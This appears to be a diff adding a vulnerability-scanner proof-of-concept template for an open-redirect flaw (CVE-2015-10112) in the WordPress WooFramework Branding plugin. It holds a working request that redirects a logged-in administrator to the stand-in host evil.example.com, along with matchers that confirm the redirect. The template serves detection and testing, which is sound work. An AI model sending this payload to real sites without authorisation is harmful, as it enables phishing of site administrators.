@@ -1,0 +1,28 @@
+[info]
+id = "POC-AVE-2015-0007"
+name = "WordPress WooFramework Branding Open Redirect PoC"
+author = "AVE"
+severity = "medium"
+tags = ["open-redirect", "wordpress", "CWE-601"]
+description = "WordPress WooFramework Branding 插件 1.0.1 及之前版本在 wooframework-branding.php 的 admin_screen_logic 函数中存在开放重定向漏洞。未对 url 参数进行转义即传入 wp_safe_redirect，导致攻击者可构造恶意 URL 将已登录管理员重定向到外部站点。需要 WordPress 管理员权限。"
+vuln_id = ["CVE-2015-10112", "AVE-2015-0007"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/wp-admin/admin.php"
+query.page = "wooframework-branding"
+query.url = "http://evil.example.com"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [302, 301]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "header"
+words = ["Location: http://evil.example.com"]
+expect = true
